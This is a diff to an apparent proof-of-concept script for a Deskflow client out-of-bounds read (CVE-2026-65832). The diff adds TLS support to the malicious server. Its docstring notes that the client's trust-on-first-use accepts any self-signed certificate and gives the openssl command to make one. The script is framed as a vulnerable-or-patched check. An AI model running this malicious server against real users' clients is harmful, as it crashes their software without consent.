@@ -28,7 +28,7 @@ The sibling odd-length heap over-read on the same DSOP path is already fixed on
 master (setOptions rejects odd-length option vectors), so this PoC drives the
 still-live modifier-map index bug with a well-formed even-length vector.
 
-This PoC is the malicious server: it listens, speaks the plaintext v1.8
+This PoC is the malicious server: it listens, speaks the v1.8
 handshake ("Synergy" hello, then reads the client's helloback), answers the
 client's info query, then pushes the poisoned DSOP followed by a left-shift
 DKDN:
@@ -38,12 +38,22 @@ DKDN:
 
 Detection: the vulnerable client dies on the shift keystroke and drops the
 connection (VULNERABLE). A patched client that clamps the index keeps
-translating shift normally and stays connected (PASS). Prereq: point a Deskflow
-client at this host with TLS disabled, since the handshake here is plaintext.
+translating shift normally and stays connected (PASS).
+
+TLS is on by default, since that is how Deskflow ships. Deskflow trusts a
+server certificate on first use, so any self-signed cert works against a client
+that has not seen this host before:
+
+    openssl req -x509 -newkey rsa:2048 -nodes -days 1 \\
+        -keyout server.key -out server.crt -subj /CN=deskflow-poc
+
+Pass --no-tls to run the handshake in plaintext instead, which only works
+against a client explicitly pointed at a non-TLS listener.
 """
 
 import argparse
 import socket
+import ssl
 import struct
 import sys
 import time
@@ -138,11 +148,25 @@ def main():
         help="out-of-range translation-table index to poison (default 0xFBFFFF04)",
     )
     ap.add_argument("--timeout", type=float, default=60.0, help="seconds to wait for a client to connect")
+    ap.add_argument("--cert", default="server.crt", help="TLS certificate (default server.crt)")
+    ap.add_argument("--key", default="server.key", help="TLS private key (default server.key)")
+    ap.add_argument("--no-tls", action="store_true", help="run the handshake in plaintext instead of TLS")
     args = ap.parse_args()
 
     print("CVE-2026-65832 -- dsop modifier-map out-of-bounds read")
     print(f"malicious server on {args.host}:{args.port}, poison index 0x{args.index & 0xFFFFFFFF:08x}")
-    print("start a deskflow client (tls disabled) pointed at this address")
+    print(f"transport: {'plaintext' if args.no_tls else 'tls'}")
+    print("point a deskflow client at this address")
+
+    ctx = None
+    if not args.no_tls:
+        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+        try:
+            ctx.load_cert_chain(certfile=args.cert, keyfile=args.key)
+        except OSError as exc:
+            print(f"[ERROR] cannot load cert/key: {exc}")
+            print("        generate one, or pass --no-tls (see --help)")
+            return 2
 
     listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -152,12 +176,20 @@ def main():
 
     print("[*] waiting for client")
     try:
-        conn, peer = listener.accept()
+        raw, peer = listener.accept()
     except socket.timeout:
         print("[ERROR] no client connected within the timeout")
         return 2
     finally:
         listener.close()
+
+    try:
+        raw.settimeout(10.0)
+        conn = ctx.wrap_socket(raw, server_side=True) if ctx else raw
+    except ssl.SSLError as exc:
+        raw.close()
+        print(f"[ERROR] tls handshake failed: {exc}")
+        return 2
 
     try:
         conn.settimeout(10.0)
@@ -169,6 +201,11 @@ def main():
         conn.sendall(shift_keydown())
         print("sent left-shift key down to trigger the translation")
         alive = client_survived(conn)
+    except (ConnectionError, OSError, struct.error) as exc:
+        # Bailing out before the trigger tells us nothing about the bug, so
+        # report inconclusive rather than letting it look like a PASS.
+        print(f"[ERROR] peer went away during setup: {exc}")
+        return 2
     finally:
         conn.close()
 
